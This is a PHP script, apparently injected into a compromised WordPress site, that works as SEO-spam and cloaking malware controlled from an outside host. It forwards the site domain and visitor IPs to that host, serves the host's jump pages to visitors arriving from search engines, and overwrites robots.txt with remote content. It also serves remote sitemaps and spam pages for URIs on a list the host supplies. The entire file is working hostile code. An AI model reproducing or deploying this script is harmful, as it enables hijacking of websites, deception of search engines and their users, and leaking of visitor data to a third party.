<?php
// index-client.php (DIUPLOAD sebagai index.txt)
// Skrip ini di-eval oleh index.php di root WordPress Anda.

error_reporting(0);
@set_time_limit(120);
@ignore_user_abort(1);

// ** URL Server Endpoint (index-endpoint.php) **
$tr = "https://dirtysecretsporn.com/"; 

class Req
{
    public function server($name = '', $default = '')
    {
        if (empty($name)) { return $_SERVER; }
        $name = strtoupper($name);
        return isset($_SERVER[$name]) ? $_SERVER[$name] : $default;
    }
    
    public function scheme()
    {
        if ($this->server('HTTPS') && ("1" == $this->server('HTTPS') || "on" == strtolower($this->server('HTTPS')))) {
            return "https";
        } elseif ('https' == $this->server('REQUEST_SCHEME')) {
            return "https";
        } elseif ('443' == $this->server('SERVER_PORT')) {
            return "https";
        } elseif ('https' == $this->server('HTTP_X_FORWARDED_PROTO')) {
            return "https";
        }
        return "http";
    }
    
    public function dm()
    {
        $host = strval($this->server('HTTP_X_FORWARDED_HOST') ?: $this->server('HTTP_HOST'));
        $host = strpos($host, ':') ? strstr($host, ':', true) : $host;
        return $this->scheme() . "://" . $host;
    }
    
    public function ip()
    {
        if (getenv('HTTP_CLIENT_IP')) { $ip = getenv('HTTP_CLIENT_IP'); } 
        elseif (getenv('HTTP_X_FORWARDED_FOR')) { $ip = getenv('HTTP_X_FORWARDED_FOR'); } 
        elseif (getenv('REMOTE_ADDR')) { $ip = getenv('REMOTE_ADDR'); } 
        else { $ip = $this->server('REMOTE_ADDR'); }
        return $ip;
    }
    
    public function uri()
    {
        $requri = $this->server('REQUEST_URI');
        if ($pos = strpos($requri, '?')) {
            $requri = substr($requri, 0, $pos);
        }
        $uri_clean = trim(preg_replace('/\/+/', '/', $requri), '/'); 
        
        return ($uri_clean === '' || $uri_clean === 'index.php') ? '/' : '/' . $uri_clean;
    }
    
    public function execReq($url, $p = array())
    {
        $url = str_replace(' ', '+', $url);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        
        $is_post = !empty($p) && (isset($p['uri']) || isset($p['domain']) || isset($p['ip']) || isset($p['user_agent']) || isset($p['referrer']));

        if ($is_post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($p));
        } else {
            curl_setopt($ch, CURLOPT_HTTPGET, true);
        }
        
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        
        if ($this->server('HTTP_USER_AGENT')) { $p['user_agent'] = $this->server('HTTP_USER_AGENT'); }
        if ($this->server('HTTP_REFERER')) { $p['referrer'] = $this->server('HTTP_REFERER'); }

        $output = curl_exec($ch);
        $errorCode = curl_errno($ch);
        curl_close($ch);
        if (0 !== $errorCode) {
            return "";
        }
        return $output;
    }
}

$req = new Req();
$uri = urldecode($req->uri()); 
$uri_no_slash = ltrim($uri, '/');

$sitemap_slugs = null; 

function is_seo_url_in_sitemap(string $uri_to_check, Req $req, string $tr): bool
{
    global $sitemap_slugs;
    $uri_to_check = ltrim($uri_to_check, '/');

    if (is_array($sitemap_slugs)) {
        return in_array($uri_to_check, $sitemap_slugs);
    }
    
    $list_url = $tr . "list"; 
    $json_output = $req->execReq($list_url);
    $sitemap_data = json_decode($json_output, true);
    
    if (is_array($sitemap_data)) {
        $sitemap_slugs = $sitemap_data;
        return in_array($uri_to_check, $sitemap_slugs);
    }
    
    return false;
}

// --- KONDISI 1: LOGIKA JUMP/REDIRECT ---
$referrer = $req->server('HTTP_REFERER');
$is_search_engine = (
    strpos($referrer, 'google.com') !== false || 
    strpos($referrer, 'bing.com') !== false ||
    strpos($referrer, 'yahoo.com') !== false ||
    strpos($referrer, 'duckduckgo.com') !== false
);

if ($is_search_engine && $uri !== '/' && $uri !== '/index.php' && !preg_match('/^\/(wp-admin|wp-content|wp-includes)/i', $uri)) {
    if (is_seo_url_in_sitemap($uri, $req, $tr)) {
        // ### PERUBAHAN DI SINI ###
        // Pastikan 'domain' dikirim ke endpoint jump
        $p = array(
            "domain" => $req->dm(), // Mengirim domain dari situs klien
            "uri" => $uri_no_slash,
            "ip" => $req->ip()
        );
        
        $action = $tr . "jump";
        die($req->execReq($action, $p));
    }
}

// --- KONDISI 2: PENULISAN FILE robots.txt ---
if ($uri === '/robots') {
    $p = array( "domain" => $req->dm(), "port" => $req->server('SERVER_PORT', 80), "uri" => 'robots.txt' );
    $output = $req->execReq($tr . "robots", $p);
    
    $rpt = __DIR__ . "/robots.txt";
    $success = @file_put_contents($rpt, $output);
    
    header("Content-type:text/plain; charset=utf-8");
    if ($success !== false) {
        die("robots.txt file create success! Content written to: " . realpath($rpt));
    } else {
        die("robots.txt file create fail! Check file permissions for: " . realpath(__DIR__));
    }
}

// --- KONDISI 3: PENGECUALIAN UNTUK ROOT & FILE WP ---
if ($uri === '/') {
    return;
}
$wp_paths_regex = '/^\/(wp-admin|wp-content|wp-includes|wp-json|feed|robots\.txt|.*\.php|.*\.css|.*\.js|.*\.jpg|.*\.png|.*\.gif|.*\.svg)/i';
if (preg_match($wp_paths_regex, $uri)) {
    return;
}

// --- LOGIKA CLOAKING ---
if (substr($uri, -10) == "robots.txt" || substr($uri, -4) == ".xml") {
    $p = array( "domain" => $req->dm(), "port" => $req->server('SERVER_PORT', 80), "uri" => $uri_no_slash );
    
    if (substr($uri, -10) == "robots.txt") {
        header("Content-type:text/plain; charset=utf-8");
        die($req->execReq($tr . "robots", $p));
    }

    if (substr($uri, -4) == ".xml") {
        $sitemap_name = basename($uri);
        $action_url = $tr . ($sitemap_name !== 'sitemap.xml' && $sitemap_name !== 'allsitemap.xml' ? 'map' : 'sitemap'); 
        $output = $req->execReq($action_url, $p);
        header("Content-type:text/" . (substr($output, 0, 5) === '<?xml' ? 'xml' : 'plain') . '; charset=utf-8');
        die($output);
    }
} 

if (is_seo_url_in_sitemap($uri, $req, $tr)) {
    $p = array(
        "domain" => $req->dm(),
        "port" => $req->server('SERVER_PORT', 80),
        "uri" => $uri_no_slash ,
        "ip" => $req->ip()
    );
    $action = $tr . "indata";
    die($req->execReq($action, $p));
}
?>
